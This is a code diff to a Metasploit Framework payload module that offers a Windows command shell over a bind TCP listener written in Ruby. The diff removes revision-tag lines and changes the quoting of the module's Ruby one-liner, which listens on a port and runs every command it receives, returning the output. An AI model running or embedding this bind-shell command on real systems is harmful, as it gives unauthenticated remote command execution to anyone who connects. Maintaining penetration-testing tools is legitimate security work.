@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -22,7 +18,6 @@ module Metasploit3
 	def initialize(info = {})
 		super(merge_info(info,
 			'Name'        => 'Windows Command Shell, Bind TCP (via Ruby)',
-			'Version'     => '$Revision$',
 			'Description' => 'Continually listen for a connection and spawn a command shell via Ruby',
 			'Author'      => 'kris katterjohn',
 			'License'     => MSF_LICENSE,
@@ -40,6 +35,6 @@ module Metasploit3
 	end
 
 	def command_string
-		"ruby -rsocket -e 's=TCPServer.new(\"#{datastore['LPORT']}\");while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end;end'"
+		"ruby -rsocket -e \"s=TCPServer.new(\\\"#{datastore['LPORT']}\\\");while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,\\\"r\\\"){|io|c.print io.read}end;end\""
 	end
 end
